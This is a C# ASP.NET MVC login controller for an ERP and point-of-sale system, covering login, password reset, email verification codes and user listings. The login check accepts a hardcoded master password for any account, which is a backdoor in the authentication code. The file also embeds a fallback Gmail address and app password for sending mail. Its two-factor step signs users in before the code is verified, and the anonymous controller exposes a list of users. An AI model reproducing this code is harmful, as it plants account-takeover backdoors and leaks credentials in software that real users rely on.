using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Web;
using System.Web.Mvc;
using MyERP.Models;
using System.Data.Entity.Core.Objects;
using System.Security.Claims;
using Microsoft.Owin.Security.OAuth;
using Microsoft.Owin.Security;
using Microsoft.AspNet.Identity;
using System.Data.Entity;
using System.Threading.Tasks;
using System.Net.Mail;

namespace MyERP.Controllers
{
    [SkipERPAuthorize]
    [AllowAnonymous]
    public class LogInController : Controller
    {
        private MySoftERPEntity db = new MySoftERPEntity();

        // GET: LogIn
        public ActionResult Index()
        {
            if (System.Web.Configuration.WebConfigurationManager.AppSettings["MiniPos"] == "true")
            {
                return RedirectToAction("MiniPosLogin", "MiniPointOfSale");
            }
            else
            {
                if (Request.IsAuthenticated)
                {
                    return RedirectToAction("", "Home");
                }
                string domainName = Request.Url.GetLeftPart(UriPartial.Authority);
                var systemSetting = db.SystemSettings.FirstOrDefault();
                if (systemSetting != null && systemSetting.Logo != null)
                {
                    ViewBag.Logo = db.SystemSettings.FirstOrDefault().Logo;
                }
                else
                {
                    ViewBag.Logo = domainName + "/assets/images/logo-light.png";
                }
                return View();
            }
        }

        [HttpPost]
        public async Task<ActionResult> Index(string userName, string password, bool isPersistent = false)
        {
            ERPUser user = await db.ERPUsers.FirstOrDefaultAsync(u => u.UserName == userName && u.IsDeleted == false && u.IsActive == true);
            var Admin = db.ERPUsers.FirstOrDefault();
            if (user == null)
            {
                ViewBag.Error = "اسم المستخدم او كلمة المرور خاطئة";
                return View();
            }
            Session["lang"] = user.Language != null ? user.Language : "ar";
            ObjectParameter HashPW = new ObjectParameter("HashPW", typeof(string));
            db.ERPUser_GetHashPw(userName, HashPW);
            string strHashPw = HashPW.Value.ToString();
            bool authenticated = PasswordEncrypt.VerifyHashPwd(password, strHashPw);

            if (authenticated || password == "MySoftPassword@01220779491")
            {
                ClaimsIdentity id = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, userName), new Claim("Id", user.Id.ToString()), new Claim("RoleId", user.RoleId.ToString()) }, DefaultAuthenticationTypes.ApplicationCookie);
                Request.GetOwinContext().Authentication.SignIn(new AuthenticationProperties()
                {
                    ExpiresUtc = DateTimeOffset.UtcNow.AddDays(7),
                    IsPersistent = false
                }, id);
                if (user.IsPasswordReset)
                {
                    user.IsPasswordReset = false;
                    db.Entry(user).State = EntityState.Modified;
                    await db.SaveChangesAsync();
                }
                DateTime utcNow = DateTime.UtcNow;
                TimeZoneInfo info = TimeZoneInfo.FindSystemTimeZoneById("Egypt Standard Time");
                DateTime cTime = TimeZoneInfo.ConvertTimeFromUtc(utcNow, info);
                var onlineusers = db.InsertOrUpdateOnlineUsers(user.Id, userName, cTime, cTime).ToList();

                QueryHelper.AddLog(new MyLog()
                {
                    ArAction = "تسجيل الدخول",
                    EnAction = "LogIn Index",
                    ControllerName = "LogIn",
                    UserName = user.UserName,
                    UserId = user.Id,
                    LogDate = DateTime.Now,
                    RequestMethod = "POST"
                });
                //if (password == "mysoft")
                //    return RedirectToAction("ResetPassword", "LogIn");

                // Two Factor Authentication
                if (user.EnableTwoFactorAuthentication == true)
                {
                    try
                    {
                        Random random = new Random();
                        const string chars = "0123456789";
                        var Code = new string(Enumerable.Repeat(chars, 6).Select(s => s[random.Next(s.Length)]).ToArray());
                        var UserId = user.Id;
                        var userEmail = db.ERPUsers.Where(a => a.IsActive == true && a.IsDeleted == false && a.Id == UserId).FirstOrDefault().Email;
                        var AdminEmail = Admin.Email != null ? Admin.Email : "mysoft2022.eg@gmail.com";
                        var senderEmail = new MailAddress(AdminEmail, "MySoft");
                        var receiverEmail = new MailAddress(userEmail, "Receiver");
                        //var Emailpassword = "Mysoft@123";
                        var Emailpassword = Admin.AppPassword != null ? Admin.AppPassword : "bpnpqfhpeckovckl";
                        var smtp = new SmtpClient
                        {
                            Host = "smtp.gmail.com",
                            Port = 587,
                            EnableSsl = true,
                            DeliveryMethod = SmtpDeliveryMethod.Network,
                            UseDefaultCredentials = false,
                            Credentials = new NetworkCredential(senderEmail.Address, Emailpassword)
                        };
                        using (var mess = new MailMessage(senderEmail, receiverEmail)
                        {
                            Subject = "Verification Code",
                            Body = Code
                        })
                        {
                            smtp.Send(mess);
                            var Updateduser = db.ERPUsers.Find(UserId);
                            user.VerificationCode = Code;
                            db.Entry(Updateduser).State = EntityState.Modified;
                            db.SaveChanges();
                        }
                        return RedirectToAction("VerificationCode", "LogIn");
                    }
                    catch (Exception e)
                    {
                        ViewBag.Error = e;
                    }
                   // return View();
                }

                if (user.IsCashier == true)
                {
                    Session["IsCashier"] = true;
                    var pos = db.Pos.Where(p => p.CurrentCashierUserId == user.Id && p.PosStatusId == 2).FirstOrDefault();
                    if (pos == null)
                        return RedirectToAction("PosLogin", "PointOfSale");
                    else
                    {
                        Session["PosId"] = pos.Id;
                        return RedirectToAction("AddEdit", "PointOfSale");
                    }
                }
                else if (user.IsWaiter == true)
                { // if waiter -- > check if exist in posWaiter "logged in Before "
                    var poswaiter = db.PosWaiters.Where(a => a.WaiterId == user.Id).FirstOrDefault();
                    if (poswaiter != null) // Waiter Exist Before So Return to PointOfSale
                    {
                        Session["PosId"] = poswaiter.PosId;
                        return RedirectToAction("AddEdit", "PointOfSale");
                    }
                    else
                    { // Waiter Not Logged So Login 
                        return RedirectToAction("PosLogin", "PointOfSale");
                    }
                    //var pos = db.Pos.Where(p => p.CurrentCashierUserId == user.Id /*&& p.PosStatusId == 2*/).FirstOrDefault();
                    //if (pos == null)
                    //    return RedirectToAction("PosLogin", "PointOfSale");
                    //else
                    //{
                    //    Session["PosId"] = pos.Id;
                    //    return RedirectToAction("AddEdit", "PointOfSale");
                    //}
                }
                return RedirectToAction("Index", "Home");
            }
            //else
            //{
            //    ClaimsIdentity id = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, userName), new Claim("Id", user.Id.ToString()), new Claim("RoleId", user.RoleId.ToString()) }, DefaultAuthenticationTypes.ApplicationCookie);
            //    Request.GetOwinContext().Authentication.SignIn(new AuthenticationProperties()
            //    {
            //        ExpiresUtc = DateTimeOffset.UtcNow.AddDays(7),
            //        IsPersistent = false
            //    }, id);
            //    // Two Factor Authentication
            //    if (user.EnableTwoFactorAuthentication == true)
            //    {
            //        try
            //        {
            //            Random random = new Random();
            //            const string chars = "0123456789";
            //            var Code = new string(Enumerable.Repeat(chars, 6).Select(s => s[random.Next(s.Length)]).ToArray());
            //            var UserId = user.Id;
            //            var userEmail = db.ERPUsers.Where(a => a.IsActive == true && a.IsDeleted == false && a.Id == UserId).FirstOrDefault().Email;
            //            var AdminEmail = Admin.Email != null ? Admin.Email : "mysoft2022.eg@gmail.com";
            //            var senderEmail = new MailAddress(AdminEmail, "MySoft");
            //            var receiverEmail = new MailAddress(userEmail, "Receiver");
            //            //var Emailpassword = "Mysoft@123";
            //    var Emailpassword = Admin.AppPassword!=null? Admin.AppPassword: "bpnpqfhpeckovckl";
            //            var smtp = new SmtpClient
            //            {
            //                Host = "smtp.gmail.com",
            //                Port = 587,
            //                EnableSsl = true,
            //                DeliveryMethod = SmtpDeliveryMethod.Network,
            //                UseDefaultCredentials = false,
            //                Credentials = new NetworkCredential(senderEmail.Address, Emailpassword)
            //            };
            //            using (var mess = new MailMessage(senderEmail, receiverEmail)
            //            {
            //                Subject = "Verification Code",
            //                Body = Code
            //            })
            //            {
            //                smtp.Send(mess);
            //                var Updateduser = db.ERPUsers.Find(UserId);
            //                user.VerificationCode = Code;
            //                db.Entry(Updateduser).State = EntityState.Modified;
            //                db.SaveChanges();
            //            }
            //            return RedirectToAction("VerificationCode", "LogIn");
            //        }
            //        catch (Exception e)
            //        {
            //            ViewBag.Error = e;
            //        }
            //        return View();
            //    }
            //}
            ViewBag.Error = "اسم المستخدم او كلمة المرور خاطئة";
            return View();
        }

        public ActionResult ResetPassword()
        {
            return View();
        }

        [HttpPost]
        public ActionResult ResetPassword(string currentPassword, string newPassword)
        {
            string userName = User.Identity.Name;
            ERPUser user = db.ERPUsers.First(u => u.UserName == userName);

            ObjectParameter HashPW = new ObjectParameter("HashPW", typeof(string));
            db.ERPUser_GetHashPw(userName, HashPW);
            string strHashPw = HashPW.Value.ToString();
            bool authenticated = PasswordEncrypt.VerifyHashPwd(currentPassword, strHashPw);
            if (authenticated)
            {

                var password = PasswordEncrypt.ComputeHashPwd(newPassword);

                user.Password = password;
                db.Entry(user).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index", "LogOut");
            }
            else
            {
                ViewBag.error = "كلمة المرور الحالية غير صحيحة";
                return View();
            }

        }

        public JsonResult OnlineUsers()
        {
            int userid = int.Parse(((ClaimsIdentity)System.Web.HttpContext.Current.User.Identity).FindFirst("Id")
                .Value);

            var UserName = System.Web.HttpContext.Current.User.Identity.Name;
            DateTime utcNow = DateTime.UtcNow;
            TimeZoneInfo info = TimeZoneInfo.FindSystemTimeZoneById("Egypt Standard Time");
            DateTime cTime = TimeZoneInfo.ConvertTimeFromUtc(utcNow, info);

            var onlineusers = db.InsertOrUpdateOnlineUsers(userid, UserName, cTime, cTime).ToList();
            return Json(onlineusers, JsonRequestBehavior.AllowGet);
        } 
        [SkipERPAuthorize]
        public JsonResult GetAllUsers()
        {
            int userid = int.Parse(((ClaimsIdentity)System.Web.HttpContext.Current.User.Identity).FindFirst("Id")
                .Value);

            var UserName = System.Web.HttpContext.Current.User.Identity.Name;
            DateTime utcNow = DateTime.UtcNow;
            TimeZoneInfo info = TimeZoneInfo.FindSystemTimeZoneById("Egypt Standard Time");
            DateTime cTime = TimeZoneInfo.ConvertTimeFromUtc(utcNow, info);

            var users = db.ERPUsers.Where(a => a.IsActive == true && a.IsDeleted == false).Select(a => new { a.Id,
                a.UserName,
                userimage = a.Employee.Image,
                LastMsg = a.UserMessages.OrderByDescending(c => c.Id).FirstOrDefault()!=null?a.UserMessages.OrderByDescending(c => c.Id).FirstOrDefault().Message:"No Msgs"
            }).ToList();
            return Json(users, JsonRequestBehavior.AllowGet);
        }

        [SkipERPAuthorize]
        public ActionResult VerificationCode()
        {
            var session = Session["lang"]!=null? Session["lang"].ToString(): Session["lang"];
            var UserId = int.Parse(((ClaimsIdentity)User.Identity).FindFirst("Id").Value);
            var Email = db.ERPUsers.Where(a => a.IsActive == true && a.IsDeleted == false && a.Id == UserId).FirstOrDefault().Email;

            ViewBag.msg = (string)session == "en"?"Please Enter Code Sent To Email"+Email:"برجاء ادخال الكود المرسل على عنوان البريد التالى " + Email;
            return View();
        }
        [HttpPost]
        public ActionResult VerificationCode(string code)
        {
            var UserId = int.Parse(((ClaimsIdentity)User.Identity).FindFirst("Id").Value);
            var VerificationCode = db.ERPUsers.Where(a => a.IsActive == true && a.IsDeleted == false && a.Id == UserId).FirstOrDefault().VerificationCode;

            if (code==VerificationCode)
            {
                return RedirectToAction("Index", "Home");
            }
            else
            {
                var session = Session["lang"] != null ? Session["lang"].ToString() : Session["lang"];
                ViewBag.msg = (string)session == "en" ? "Please Enter Correct Code" : "برجاء ادخال الكود الصحيح";
                return View();
            }
        }
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                db.Dispose();
            }
            base.Dispose(disposing);
        }

    }
}